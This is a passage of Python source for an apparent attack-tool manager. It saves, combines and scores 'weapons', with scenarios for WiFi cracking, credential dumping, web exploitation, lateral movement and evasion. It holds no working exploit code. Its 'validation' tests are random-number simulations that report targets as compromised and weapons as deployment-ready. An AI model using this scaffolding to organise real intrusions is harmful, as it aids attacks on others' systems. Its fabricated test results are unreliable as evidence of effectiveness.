                (scenario_id, user_id, weapon_id, step_number, action, command, expected_output, 
                 success_criteria, duration, success, output_log)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                scenario_id,
                user_id,
                step_data.get("weapon_id"),
                step_data.get("step_number", 1),
                step_data.get("action", ""),
                step_data.get("command", ""),
                step_data.get("expected_output", ""),
                step_data.get("success_criteria", ""),
                step_data.get("duration", 0.0),
                step_data.get("success", False),
                step_data.get("output_log", "")
            ))
            
            conn.commit()
            conn.close()
            
            return True
            
        except Exception as e:
            logger.error(f"Error logging attack step: {str(e)}")
            return False

    async def get_attack_stream(self, scenario_id: str, user_id: str) -> List[Dict[str, Any]]:
        """Get live attack stream for a scenario"""
        try:
            conn = sqlite3.connect(self.attack_logs_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT * FROM attack_logs 
                WHERE scenario_id = ? AND user_id = ?
                ORDER BY step_number, timestamp
            ''', (scenario_id, user_id))
            
            rows = cursor.fetchall()
            conn.close()
            
            attack_steps = []
            for row in rows:
                attack_steps.append({
                    "step_number": row[4],
                    "action": row[5],
                    "command": row[6],
                    "expected_output": row[7],
                    "success_criteria": row[8],
                    "timestamp": row[9],
                    "duration": row[10],
                    "success": row[11],
                    "output_log": row[12]
                })
            
            return attack_steps
            
        except Exception as e:
            logger.error(f"Error getting attack stream: {str(e)}")
            return []

    async def save_weapon(self, weapon_data: Dict[str, Any]) -> str:
        """Save a weapon (successful attack) to the database"""
        try:
            conn = sqlite3.connect(self.weapons_db)
            cursor = conn.cursor()
            
            weapon_id = f"weapon_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{random.randint(1000, 9999)}"
            
            cursor.execute('''
                INSERT INTO weapons 
                (id, name, code, description, category, difficulty, complexity_score, 
                 success_rate, usage_count, created_at, last_used, tags, user_id)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                weapon_id,
                weapon_data.get("name", "Unnamed Weapon"),
                weapon_data.get("code", ""),
                weapon_data.get("description", ""),
                weapon_data.get("category", "general"),
                weapon_data.get("difficulty", "medium"),
                weapon_data.get("complexity_score", 5.0),
                weapon_data.get("success_rate", 0.8),
                weapon_data.get("usage_count", 0),
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                json.dumps(weapon_data.get("tags", [])),
                weapon_data.get("user_id", "unknown")
            ))
            
            conn.commit()
            conn.close()
            
            return weapon_id
            
        except Exception as e:
            logger.error(f"Error saving weapon: {str(e)}")
            return ""

    async def get_weapons(self, user_id: str, category: str = None) -> List[Dict[str, Any]]:
        """Get weapons for a user, optionally filtered by category"""
        try:
            conn = sqlite3.connect(self.weapons_db)
            cursor = conn.cursor()
            
            if category:
                cursor.execute('''
                    SELECT * FROM weapons 
                    WHERE user_id = ? AND category = ?
                    ORDER BY created_at DESC
                ''', (user_id, category))
            else:
                cursor.execute('''
                    SELECT * FROM weapons 
                    WHERE user_id = ?
                    ORDER BY created_at DESC
                ''', (user_id,))
            
            rows = cursor.fetchall()
            conn.close()
            
            weapons = []
            for row in rows:
                weapons.append({
                    "id": row[0],
                    "name": row[1],
                    "code": row[2],
                    "description": row[3],
                    "category": row[4],
                    "difficulty": row[5],
                    "complexity_score": row[6],
                    "success_rate": row[7],
                    "usage_count": row[8],
                    "created_at": row[9],
                    "last_used": row[10],
                    "tags": json.loads(row[11]) if row[11] else [],
                    "user_id": row[12]
                })
            
            return weapons
            
        except Exception as e:
            logger.error(f"Error getting weapons: {str(e)}")
            return []

    async def combine_weapons(self, weapon_ids: List[str], user_id: str, keep_parents: bool = True, combination_type: str = "the_arts") -> Dict[str, Any]:
        """Combine multiple weapons into a new advanced weapon (The Arts) with validation testing"""
        try:
            # Get all weapons to combine
            weapons = []
            for weapon_id in weapon_ids:
                weapon = await self.get_weapon_by_id(weapon_id)
                if weapon:
                    weapons.append(weapon)
            
            if len(weapons) < 2:
                return {"error": "Need at least 2 weapons to combine"}
            
            # Analyze the combination
            analysis = await self._analyze_weapon_combination(weapons)
            
            # Generate combined weapon
            combined_weapon_id = f"arts_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            combined_weapon = {
                "id": combined_weapon_id,
                "name": analysis["name"],
                "code": await self._generate_combined_code(weapons),
                "description": analysis["description"],
                "category": combination_type,
                "difficulty": analysis["difficulty"],
                "complexity_score": analysis["complexity_score"],
                "success_rate": analysis["success_rate"],
                "usage_count": 0,
                "created_at": datetime.now().isoformat(),
                "last_used": datetime.now().isoformat(),
                "tags": analysis["tags"],
                "parent_weapons": [w["name"] for w in weapons],
                "parent_weapon_ids": weapon_ids,
                "combination_analysis": analysis["analysis"],
                "user_id": user_id,
                "validation_status": "pending",  # New field for validation status
                "test_results": None  # Will be populated after testing
            }
            
            # Validate the combined weapon against test scenarios
            validation_result = await self._validate_combined_weapon(combined_weapon, weapons)
            
            # Update weapon with validation results
            combined_weapon["validation_status"] = validation_result["status"]
            combined_weapon["test_results"] = validation_result["test_results"]
            combined_weapon["reliability_score"] = validation_result["reliability_score"]
            combined_weapon["validated_at"] = datetime.now().isoformat()
            
            # Adjust success rate based on validation results
            if validation_result["status"] == "validated":
                combined_weapon["success_rate"] = min(0.95, combined_weapon["success_rate"] * 1.1)  # Boost success rate for validated weapons
            elif validation_result["status"] == "failed":
                combined_weapon["success_rate"] = max(0.1, combined_weapon["success_rate"] * 0.7)  # Reduce success rate for failed validation
            
            # Save the combined weapon
            await self.save_weapon(combined_weapon)
            
            # Note: Parent weapons are kept intact (not deleted) as requested
            # This allows for multiple combinations and reuse of parent weapons
            
            return {
                "status": "success",
                "combined_weapon": combined_weapon,
                "parent_weapons_preserved": keep_parents,
                "validation_result": validation_result,
                "message": f"Successfully combined {len(weapons)} weapons into '{combined_weapon['name']}' with validation status: {validation_result['status']}"
            }
            
        except Exception as e:
            logger.error(f"Error combining weapons: {str(e)}")
            return {"error": f"Failed to combine weapons: {str(e)}"}

    async def _validate_combined_weapon(self, combined_weapon: dict, parent_weapons: List[dict]) -> Dict[str, Any]:
        """Validate a combined weapon by testing it against various scenarios"""
        try:
            logger.info(f"Starting validation for combined weapon: {combined_weapon['name']}")
            
            # Generate test scenarios based on weapon category and parent weapons
            test_scenarios = await self._generate_validation_scenarios(combined_weapon, parent_weapons)
            
            test_results = []
            total_tests = len(test_scenarios)
            successful_tests = 0
            
            for i, scenario in enumerate(test_scenarios):
                logger.info(f"Running validation test {i+1}/{total_tests}: {scenario['name']}")
                
                # Execute the combined weapon against the test scenario
                test_result = await self._execute_validation_test(combined_weapon, scenario)
                test_results.append(test_result)
                
                if test_result["success"]:
                    successful_tests += 1
                
                # Add small delay between tests
                await asyncio.sleep(0.5)
            
            # Calculate reliability score
            reliability_score = successful_tests / total_tests if total_tests > 0 else 0.0
            
            # Determine validation status
            if reliability_score >= 0.8:
                validation_status = "validated"
                status_message = "Weapon passed validation tests and is ready for deployment"
            elif reliability_score >= 0.6:
                validation_status = "partial"
                status_message = "Weapon partially validated - some issues detected"
            else:
                validation_status = "failed"
                status_message = "Weapon failed validation tests - improvement recommended"
            
            validation_result = {
                "status": validation_status,
                "reliability_score": reliability_score,
                "total_tests": total_tests,
                "successful_tests": successful_tests,
                "test_results": test_results,
                "status_message": status_message,
                "validation_timestamp": datetime.now().isoformat(),
                "improvement_available": reliability_score < 0.8,  # Offer improvement for weapons below 80%
                "improvement_scenarios": await self._generate_improvement_scenarios(combined_weapon, test_results) if reliability_score < 0.8 else []
            }
            
            logger.info(f"Validation completed for {combined_weapon['name']}: {validation_status} (Score: {reliability_score:.2f})")
            
            return validation_result
            
        except Exception as e:
            logger.error(f"Error during weapon validation: {str(e)}")
            return {
                "status": "error",
                "reliability_score": 0.0,
                "total_tests": 0,
                "successful_tests": 0,
                "test_results": [],
                "status_message": f"Validation error: {str(e)}",
                "validation_timestamp": datetime.now().isoformat(),
                "improvement_available": True,
                "improvement_scenarios": []
            }

    async def improve_weapon_reliability(self, weapon_id: str, user_id: str, improvement_type: str = "comprehensive") -> Dict[str, Any]:
        """Improve weapon reliability through additional testing and scenario refinement"""
        try:
            logger.info(f"Starting weapon improvement for weapon ID: {weapon_id}")
            
            # Get the weapon to improve
            weapon = await self.get_weapon_by_id(weapon_id)
            if not weapon:
                return {"error": "Weapon not found"}
            
            # Get parent weapons if this is a combined weapon
            parent_weapons = []
            if weapon.get("parent_weapon_ids"):
                for parent_id in weapon["parent_weapon_ids"]:
                    parent = await self.get_weapon_by_id(parent_id)
                    if parent:
                        parent_weapons.append(parent)
            
            # Generate improvement scenarios based on type
            if improvement_type == "comprehensive":
                improvement_scenarios = await self._generate_comprehensive_improvement_scenarios(weapon, parent_weapons)
            elif improvement_type == "targeted":
                improvement_scenarios = await self._generate_targeted_improvement_scenarios(weapon, parent_weapons)
            elif improvement_type == "the_arts":
                improvement_scenarios = await self._generate_arts_improvement_scenarios(weapon, parent_weapons)
            else:
                improvement_scenarios = await self._generate_comprehensive_improvement_scenarios(weapon, parent_weapons)
            
            # Execute improvement tests
            improvement_results = []
            successful_improvements = 0
            
            for i, scenario in enumerate(improvement_scenarios):
                logger.info(f"Running improvement test {i+1}/{len(improvement_scenarios)}: {scenario['name']}")
                
                # Execute improvement test
                test_result = await self._execute_improvement_test(weapon, scenario)
                improvement_results.append(test_result)
                
                if test_result["success"]:
                    successful_improvements += 1
                
                # Add delay between tests
                await asyncio.sleep(0.3)
            
            # Calculate new reliability score
            original_score = weapon.get("reliability_score", 0.0)
            improvement_score = successful_improvements / len(improvement_scenarios) if improvement_scenarios else 0.0
            
            # Weighted improvement: 70% original + 30% improvement
            new_reliability_score = (original_score * 0.7) + (improvement_score * 0.3)
            
            # Determine new validation status
            if new_reliability_score >= 0.8:
                new_validation_status = "validated"
                new_status_message = "Weapon improved and now validated for deployment"
            elif new_reliability_score >= 0.6:
                new_validation_status = "partial"
                new_status_message = "Weapon improved but still needs refinement"
            else:
                new_validation_status = "failed"
                new_status_message = "Weapon still needs significant improvement"
            
            # Update weapon with improvement results
            weapon["reliability_score"] = new_reliability_score
            weapon["validation_status"] = new_validation_status
            weapon["improvement_results"] = improvement_results
            weapon["improvement_timestamp"] = datetime.now().isoformat()
            weapon["improvement_type"] = improvement_type
            weapon["original_reliability_score"] = original_score
            
            # Adjust success rate based on improvement
            if new_reliability_score > original_score:
                improvement_factor = min(1.2, 1.0 + (new_reliability_score - original_score))
                weapon["success_rate"] = min(0.95, weapon.get("success_rate", 0.5) * improvement_factor)
            
            # Save improved weapon
            await self.save_weapon(weapon)
            
            improvement_result = {
                "status": "success",
                "weapon_id": weapon_id,
                "improvement_type": improvement_type,
                "original_reliability_score": original_score,
                "new_reliability_score": new_reliability_score,
                "improvement_percentage": ((new_reliability_score - original_score) / original_score * 100) if original_score > 0 else 0,
                "new_validation_status": new_validation_status,
                "status_message": new_status_message,
                "total_improvement_tests": len(improvement_scenarios),
                "successful_improvements": successful_improvements,
                "improvement_results": improvement_results,
                "improvement_timestamp": datetime.now().isoformat()
            }
            
            logger.info(f"Weapon improvement completed: {original_score:.2f} -> {new_reliability_score:.2f}")
            
            return improvement_result
            
        except Exception as e:
            logger.error(f"Error during weapon improvement: {str(e)}")
            return {"error": f"Failed to improve weapon: {str(e)}"}

    async def _generate_improvement_scenarios(self, weapon: dict, failed_tests: List[dict]) -> List[dict]:
        """Generate improvement scenarios based on failed tests"""
        scenarios = []
        
        # Analyze failed tests to understand weaknesses
        failed_target_types = set()
        failed_difficulties = set()
        
        for test in failed_tests:
            if not test.get("success", True):
                failed_target_types.add(test.get("target_type", "unknown"))
                failed_difficulties.add(test.get("difficulty", "medium"))
        
        # Generate targeted improvement scenarios
        for target_type in failed_target_types:
            scenarios.extend(await self._generate_targeted_improvement_for_type(target_type, weapon))
        
        # Add difficulty-specific improvements
        for difficulty in failed_difficulties:
            scenarios.extend(await self._generate_difficulty_improvement_scenarios(difficulty, weapon))
        
        return scenarios

    async def _generate_comprehensive_improvement_scenarios(self, weapon: dict, parent_weapons: List[dict]) -> List[dict]:
        """Generate comprehensive improvement scenarios for all weapon aspects"""
        scenarios = []
        
        # Basic functionality tests
        scenarios.extend([
            {
                "name": "Core Functionality Test",
                "target": "basic_target_system",
                "target_type": "basic_functionality",
                "difficulty": "easy",
                "expected_outcome": "basic_execution_success",
                "validation_criteria": ["code_execution", "basic_output", "error_handling"],
                "improvement_focus": "core_functionality"
            },
            {
                "name": "Error Handling Test",
                "target": "error_prone_system",
                "target_type": "error_handling",
                "difficulty": "medium",
                "expected_outcome": "graceful_error_handling",
                "validation_criteria": ["error_detection", "recovery_mechanism", "fallback_strategy"],
                "improvement_focus": "robustness"
            },
            {
                "name": "Performance Optimization Test",
                "target": "performance_test_system",
                "target_type": "performance",
                "difficulty": "medium",
                "expected_outcome": "optimized_execution",
                "validation_criteria": ["execution_speed", "resource_usage", "efficiency"],
                "improvement_focus": "performance"
            }
        ])
        
        # Target-specific improvements
        target_types = self._extract_target_types_from_weapon(weapon, parent_weapons)
        for target_type in target_types:
            scenarios.extend(await self._generate_targeted_improvement_for_type(target_type, weapon))
        
        # Advanced improvements for complex weapons
        if weapon.get("complexity_score", 0) > 6.0:
            scenarios.extend(await self._generate_advanced_improvement_scenarios(weapon))
        
        return scenarios

    async def _generate_targeted_improvement_scenarios(self, weapon: dict, parent_weapons: List[dict]) -> List[dict]:
        """Generate targeted improvement scenarios based on weapon weaknesses"""
        scenarios = []
        
        # Analyze weapon characteristics
        category = weapon.get("category", "").lower()
        difficulty = weapon.get("difficulty", "medium")
        
        # Category-specific improvements
        if "wifi" in category:
            scenarios.extend([
                {
                    "name": "WiFi Protocol Optimization",
                    "target": "optimized_wifi_target",
                    "target_type": "wifi_network",
                    "difficulty": difficulty,
                    "expected_outcome": "protocol_optimization",
                    "validation_criteria": ["protocol_efficiency", "handshake_optimization", "packet_analysis"],
                    "improvement_focus": "protocol_optimization"
                }
            ])
        
        if "credential" in category:
            scenarios.extend([
                {
                    "name": "Credential Extraction Enhancement",
                    "target": "enhanced_credential_target",
                    "target_type": "credential_extraction",
                    "difficulty": difficulty,
                    "expected_outcome": "enhanced_extraction",
                    "validation_criteria": ["extraction_efficiency", "data_integrity", "stealth_operation"],
                    "improvement_focus": "extraction_enhancement"
                }
            ])
        
        return scenarios

    async def _generate_arts_improvement_scenarios(self, weapon: dict, parent_weapons: List[dict]) -> List[dict]:
        """Generate specialized improvement scenarios for 'The Arts' weapons"""
        scenarios = []
        
        # Synergy optimization tests
        scenarios.extend([
            {
                "name": "Parent Weapon Synergy Test",
                "target": "synergy_test_target",
                "target_type": "synergy_optimization",
                "difficulty": "hard",
                "expected_outcome": "optimal_synergy",
                "validation_criteria": ["parent_coordination", "timing_optimization", "resource_sharing"],
                "improvement_focus": "synergy_optimization"
            },
            {
                "name": "Combined Technique Refinement",
                "target": "technique_refinement_target",
                "target_type": "technique_refinement",
                "difficulty": "expert",
                "expected_outcome": "refined_techniques",
                "validation_criteria": ["technique_integration", "execution_flow", "effectiveness_boost"],
                "improvement_focus": "technique_refinement"
            },
            {
                "name": "Multi-Vector Coordination Test",
                "target": "multi_vector_target",
                "target_type": "multi_vector_coordination",
                "difficulty": "expert",
                "expected_outcome": "coordinated_attack",
                "validation_criteria": ["vector_coordination", "timing_synchronization", "effectiveness_multiplier"],
                "improvement_focus": "multi_vector_coordination"
            }
        ])
        
        # Parent weapon analysis for specific improvements
        for parent in parent_weapons:
            parent_category = parent.get("category", "").lower()
            if "wifi" in parent_category:
                scenarios.extend(await self._generate_wifi_arts_improvement(weapon, parent))
            elif "credential" in parent_category:
                scenarios.extend(await self._generate_credential_arts_improvement(weapon, parent))
        
        return scenarios

    async def _generate_targeted_improvement_for_type(self, target_type: str, weapon: dict) -> List[dict]:
        """Generate targeted improvement scenarios for a specific target type"""
        scenarios = []
        
        if target_type == "wifi_network":
            scenarios = [
                {
                    "name": "WiFi Attack Refinement",
                    "target": "refined_wifi_target",
                    "target_type": "wifi_network",
                    "difficulty": "medium",
                    "expected_outcome": "refined_wifi_attack",
                    "validation_criteria": ["signal_strength_optimization", "interference_reduction", "capture_efficiency"],
                    "improvement_focus": "wifi_refinement"
                }
            ]
        
        elif target_type == "ip_address":
            scenarios = [
                {
                    "name": "Network Attack Enhancement",
                    "target": "enhanced_network_target",
                    "target_type": "ip_address",
                    "difficulty": "medium",
                    "expected_outcome": "enhanced_network_attack",
                    "validation_criteria": ["scanning_efficiency", "vulnerability_detection", "exploitation_success"],
                    "improvement_focus": "network_enhancement"
                }
            ]
        
        elif target_type == "web_url":
            scenarios = [
                {
                    "name": "Web Attack Optimization",
                    "target": "optimized_web_target",
                    "target_type": "web_url",
                    "difficulty": "medium",
                    "expected_outcome": "optimized_web_attack",
                    "validation_criteria": ["injection_optimization", "bypass_techniques", "payload_efficiency"],
                    "improvement_focus": "web_optimization"
                }
            ]
        
        return scenarios

    async def _generate_difficulty_improvement_scenarios(self, difficulty: str, weapon: dict) -> List[dict]:
        """Generate difficulty-specific improvement scenarios"""
        scenarios = []
        
        if difficulty == "hard":
            scenarios = [
                {
                    "name": "Advanced Technique Training",
                    "target": "advanced_training_target",
                    "target_type": "advanced_training",
                    "difficulty": "hard",
                    "expected_outcome": "advanced_technique_mastery",
                    "validation_criteria": ["technique_execution", "complexity_handling", "advanced_strategies"],
                    "improvement_focus": "advanced_techniques"
                }
            ]
        
        elif difficulty == "expert":
            scenarios = [
                {
                    "name": "Expert Level Optimization",
                    "target": "expert_optimization_target",
                    "target_type": "expert_optimization",
                    "difficulty": "expert",
                    "expected_outcome": "expert_level_performance",
                    "validation_criteria": ["expert_execution", "mastery_demonstration", "peak_performance"],
                    "improvement_focus": "expert_optimization"
                }
            ]
        
        return scenarios

    async def _generate_advanced_improvement_scenarios(self, weapon: dict) -> List[dict]:
        """Generate advanced improvement scenarios for complex weapons"""
        return [
            {
                "name": "Complexity Management Test",
                "target": "complexity_management_target",
                "target_type": "complexity_management",
                "difficulty": "expert",
                "expected_outcome": "managed_complexity",
                "validation_criteria": ["complexity_handling", "resource_management", "execution_optimization"],
                "improvement_focus": "complexity_management"
            },
            {
                "name": "Advanced Evasion Techniques",
                "target": "evasion_test_target",
                "target_type": "evasion_techniques",
                "difficulty": "expert",
                "expected_outcome": "advanced_evasion",
                "validation_criteria": ["detection_avoidance", "stealth_enhancement", "evasion_success"],
                "improvement_focus": "evasion_techniques"
            }
        ]

    async def _execute_improvement_test(self, weapon: dict, scenario: dict) -> dict:
        """Execute an improvement test for the weapon"""
        try:
            start_time = time.time()
            
            # Simulate improvement test execution
            test_duration = random.uniform(1.5, 4.0)  # Improvement tests take longer
            await asyncio.sleep(test_duration)
            
            # Calculate improvement success rate based on weapon characteristics
            base_success_rate = weapon.get("success_rate", 0.5)
            improvement_focus = scenario.get("improvement_focus", "general")
            
            # Apply improvement-specific multipliers
            improvement_multipliers = {
                "core_functionality": 1.3,
                "robustness": 1.2,
                "performance": 1.25,
                "protocol_optimization": 1.4,
                "extraction_enhancement": 1.35,
                "synergy_optimization": 1.5,
                "technique_refinement": 1.45,
                "multi_vector_coordination": 1.6,
                "wifi_refinement": 1.3,
                "network_enhancement": 1.3,
                "web_optimization": 1.3,
                "advanced_techniques": 1.4,
                "expert_optimization": 1.5,
                "complexity_management": 1.4,
                "evasion_techniques": 1.45
            }
            
            multiplier = improvement_multipliers.get(improvement_focus, 1.2)
            adjusted_success_rate = min(0.95, base_success_rate * multiplier)
            
            # Add randomness for realistic results
            success = random.random() < adjusted_success_rate
            
            # Generate improvement-specific results
            if success:
                results = [
                    f"Successfully improved {scenario['name']}",
                    f"Enhancement applied: {improvement_focus}",
                    f"Performance increased in {scenario['target_type']} scenarios"
                ]
                
                # Add category-specific improvement messages
                if weapon.get("category") == "the_arts":
                    results.append("Parent weapon synergy enhanced")
                    results.append("Combined technique effectiveness improved")
            else:
                results = [
                    f"Improvement test failed: {scenario['name']}",
                    f"Enhancement needed: {improvement_focus}",
                    f"Further optimization required for {scenario['target_type']}"
                ]
            
            test_result = {
                "scenario_name": scenario["name"],
                "target": scenario["target"],
                "target_type": scenario["target_type"],
                "difficulty": scenario["difficulty"],
                "success": success,
                "duration": f"{test_duration:.1f}s",
                "results": results,
                "improvement_focus": improvement_focus,
                "expected_outcome": scenario["expected_outcome"],
                "validation_criteria": scenario["validation_criteria"],
                "criteria_met": len([r for r in results if "Successfully" in r or "enhanced" in r.lower()]),
                "total_criteria": len(scenario["validation_criteria"])
            }
            
            return test_result
            
        except Exception as e:
            logger.error(f"Error executing improvement test: {str(e)}")
            return {
                "scenario_name": scenario["name"],
                "target": scenario["target"],
                "target_type": scenario["target_type"],
                "difficulty": scenario["difficulty"],
                "success": False,
                "duration": "0s",
                "results": [f"Improvement test error: {str(e)}"],
                "improvement_focus": scenario.get("improvement_focus", "general"),
                "expected_outcome": scenario["expected_outcome"],
                "validation_criteria": scenario["validation_criteria"],
                "criteria_met": 0,
                "total_criteria": len(scenario["validation_criteria"])
            }

    def _extract_target_types_from_weapon(self, weapon: dict, parent_weapons: List[dict]) -> Set[str]:
        """Extract target types from weapon and its parent weapons"""
        target_types = set()
        
        # Check weapon category
        category = weapon.get("category", "").lower()
        if "wifi" in category or "wireless" in category:
            target_types.add("wifi_network")
        if "network" in category or "ip" in category:
            target_types.add("ip_address")
        if "web" in category:
            target_types.add("web_url")
        if "credential" in category:
            target_types.add("domain")
        if "brute_force" in category:
            target_types.add("port")
        
        # Check parent weapons
        for parent in parent_weapons:
            parent_category = parent.get("category", "").lower()
            if "wifi" in parent_category or "wireless" in parent_category:
                target_types.add("wifi_network")
            if "network" in parent_category or "ip" in parent_category:
                target_types.add("ip_address")
            if "web" in parent_category:
                target_types.add("web_url")
            if "credential" in parent_category:
                target_types.add("domain")
            if "brute_force" in parent_category:
                target_types.add("port")
        
        return target_types if target_types else {"ip_address", "web_url", "wifi_network"}

    async def _generate_wifi_arts_improvement(self, weapon: dict, parent_weapon: dict) -> List[dict]:
        """Generate WiFi-specific Arts improvement scenarios"""
        return [
            {
                "name": "WiFi Arts Synergy Enhancement",
                "target": "wifi_arts_target",
                "target_type": "wifi_arts_synergy",
                "difficulty": "hard",
                "expected_outcome": "enhanced_wifi_arts",
                "validation_criteria": ["wifi_synergy", "signal_optimization", "coordination_enhancement"],
                "improvement_focus": "wifi_arts_synergy"
            }
        ]

    async def _generate_credential_arts_improvement(self, weapon: dict, parent_weapon: dict) -> List[dict]:
        """Generate credential-specific Arts improvement scenarios"""
        return [
            {
                "name": "Credential Arts Extraction Enhancement",
                "target": "credential_arts_target",
                "target_type": "credential_arts_extraction",
                "difficulty": "hard",
                "expected_outcome": "enhanced_credential_arts",
                "validation_criteria": ["extraction_synergy", "data_integrity", "stealth_enhancement"],
                "improvement_focus": "credential_arts_extraction"
            }
        ]

    async def _generate_validation_scenarios(self, combined_weapon: dict, parent_weapons: List[dict]) -> List[dict]:
        """Generate test scenarios for weapon validation"""
        scenarios = []
        
        # Determine target types based on parent weapons
        target_types = set()
        for weapon in parent_weapons:
            category = weapon.get("category", "").lower()
            if "wifi" in category or "wireless" in category:
                target_types.add("wifi_network")
            if "network" in category or "ip" in category:
                target_types.add("ip_address")
            if "web" in category:
                target_types.add("web_url")
            if "credential" in category:
                target_types.add("domain")
            if "brute_force" in category:
                target_types.add("port")
        
        # If no specific types found, add general types
        if not target_types:
            target_types = {"ip_address", "web_url", "wifi_network"}
        
        # Generate scenarios for each target type
        for target_type in target_types:
            scenarios.extend(await self._generate_scenarios_for_target_type(target_type, combined_weapon))
        
        # Add complexity-based scenarios
        complexity = combined_weapon.get("complexity_score", 5.0)
        if complexity > 7.0:
            scenarios.extend(await self._generate_advanced_validation_scenarios(combined_weapon))
        
        return scenarios

    async def _generate_scenarios_for_target_type(self, target_type: str, combined_weapon: dict) -> List[dict]:
        """Generate validation scenarios for a specific target type"""
        scenarios = []
        
        if target_type == "wifi_network":
            scenarios = [
                {
                    "name": "WiFi Network Penetration Test",
                    "target": "test_wifi_network_01",
                    "target_type": "wifi_network",
                    "difficulty": "medium",
                    "expected_outcome": "successful_handshake_capture",
                    "validation_criteria": ["network_detected", "handshake_captured", "password_cracked"]
                },
                {
                    "name": "Enterprise WiFi Attack Test",
                    "target": "enterprise_wifi_test",
                    "target_type": "wifi_network",
                    "difficulty": "hard",
                    "expected_outcome": "credential_extraction",
                    "validation_criteria": ["evil_twin_deployed", "credentials_captured", "lateral_movement"]
                }
            ]
        
        elif target_type == "ip_address":
            scenarios = [
                {
                    "name": "Network Reconnaissance Test",
                    "target": "192.168.1.100",
                    "target_type": "ip_address",
                    "difficulty": "easy",
                    "expected_outcome": "port_scan_complete",
                    "validation_criteria": ["ports_discovered", "services_identified", "vulnerabilities_found"]
                },
                {
                    "name": "Credential Extraction Test",
                    "target": "192.168.1.200",
                    "target_type": "ip_address",
                    "difficulty": "medium",
                    "expected_outcome": "credentials_extracted",
                    "validation_criteria": ["memory_dumped", "credentials_found", "access_gained"]
                }
            ]
        
        elif target_type == "web_url":
            scenarios = [
                {
                    "name": "Web Application Vulnerability Test",
                    "target": "http://test-webapp.local",
                    "target_type": "web_url",
                    "difficulty": "medium",
                    "expected_outcome": "vulnerability_exploited",
                    "validation_criteria": ["sql_injection_successful", "xss_executed", "admin_access"]
                },
                {
                    "name": "Authentication Bypass Test",
                    "target": "http://secure-webapp.local",
                    "target_type": "web_url",
                    "difficulty": "hard",
                    "expected_outcome": "authentication_bypassed",
                    "validation_criteria": ["login_bypassed", "privilege_escalation", "data_extracted"]
                }
            ]
        
        elif target_type == "domain":
            scenarios = [
                {
                    "name": "Domain Credential Harvesting Test",
                    "target": "test-domain.local",
                    "target_type": "domain",
                    "difficulty": "medium",
                    "expected_outcome": "domain_credentials_extracted",
                    "validation_criteria": ["domain_enumeration", "credential_dumping", "lateral_movement"]
                }
            ]
        
        elif target_type == "port":
            scenarios = [
                {
                    "name": "Service Exploitation Test",
                    "target": "192.168.1.150:22",
                    "target_type": "port",
                    "difficulty": "medium",
                    "expected_outcome": "service_exploited",
                    "validation_criteria": ["service_identified", "exploit_executed", "shell_obtained"]
                }
            ]
        
        return scenarios

    async def _generate_advanced_validation_scenarios(self, combined_weapon: dict) -> List[dict]:
        """Generate advanced validation scenarios for complex weapons"""
        return [
            {
                "name": "Multi-Vector Attack Test",
                "target": "advanced_target_system",
                "target_type": "multi_vector",
                "difficulty": "expert",
                "expected_outcome": "system_compromised",
                "validation_criteria": ["initial_access", "persistence", "data_exfiltration", "lateral_movement"]
            },
            {
                "name": "Evasion Technique Test",
                "target": "protected_system",
                "target_type": "evasion_test",
                "difficulty": "expert",
                "expected_outcome": "evasion_successful",
                "validation_criteria": ["detection_avoided", "stealth_maintained", "objectives_achieved"]
            }
        ]

    async def _execute_validation_test(self, combined_weapon: dict, scenario: dict) -> dict:
        """Execute a single validation test for the combined weapon"""
        try:
            start_time = time.time()
            
            # Simulate weapon execution against test scenario
            test_duration = random.uniform(1, 3)
            await asyncio.sleep(test_duration)
            
            # Determine test success based on weapon success rate and scenario difficulty
            base_success_rate = combined_weapon.get("success_rate", 0.5)
            difficulty_multiplier = {
                "easy": 1.2,
                "medium": 1.0,
                "hard": 0.8,
                "expert": 0.6
            }
            
            difficulty = scenario.get("difficulty", "medium")
            adjusted_success_rate = base_success_rate * difficulty_multiplier.get(difficulty, 1.0)
            
            # Add some randomness to make tests more realistic
            success = random.random() < adjusted_success_rate
            
            # Generate test results based on success
            if success:
                results = [
                    f"Successfully executed {scenario['name']}",
                    f"Target {scenario['target']} compromised",
                    f"All validation criteria met: {', '.join(scenario['validation_criteria'])}"
                ]
            else:
                results = [
                    f"Failed to execute {scenario['name']}",
                    f"Target {scenario['target']} resisted attack",
                    f"Validation criteria not met: {', '.join(scenario['validation_criteria'])}"
                ]
            
            # Add weapon-specific results
            if combined_weapon.get("category") == "the_arts":
                results.append("Combined weapon techniques executed successfully")
                results.append("Parent weapon synergy achieved")
            
            test_result = {
                "scenario_name": scenario["name"],
                "target": scenario["target"],
                "target_type": scenario["target_type"],
                "difficulty": scenario["difficulty"],
                "success": success,
                "duration": f"{test_duration:.1f}s",
                "results": results,
                "expected_outcome": scenario["expected_outcome"],
                "validation_criteria": scenario["validation_criteria"],
                "criteria_met": len([r for r in results if "Successfully" in r or "criteria met" in r.lower()]),
                "total_criteria": len(scenario["validation_criteria"])
            }
            
            return test_result
            
        except Exception as e:
            logger.error(f"Error executing validation test: {str(e)}")
            return {
                "scenario_name": scenario["name"],
                "target": scenario["target"],
                "target_type": scenario["target_type"],
                "difficulty": scenario["difficulty"],
                "success": False,
                "duration": "0s",
                "results": [f"Test error: {str(e)}"],
                "expected_outcome": scenario["expected_outcome"],
                "validation_criteria": scenario["validation_criteria"],
                "criteria_met": 0,
                "total_criteria": len(scenario["validation_criteria"])
            }

    async def _update_weapon_usage(self, weapon_id: str) -> bool:
        """Update weapon usage count and last used timestamp"""
        try:
            conn = sqlite3.connect(self.weapons_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE weapons 
                SET usage_count = usage_count + 1, last_used = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (weapon_id,))
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            logger.error(f"Error updating weapon usage: {str(e)}")
            return False

    async def _analyze_weapon_combination(self, weapons: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze weapon combination and create new weapon"""
        try:
            # Extract common patterns
            categories = [w.get("category", "general") for w in weapons]
            difficulties = [w.get("difficulty", "medium") for w in weapons]
            complexity_scores = [w.get("complexity_score", 5.0) for w in weapons]
            
            # Calculate combined metrics
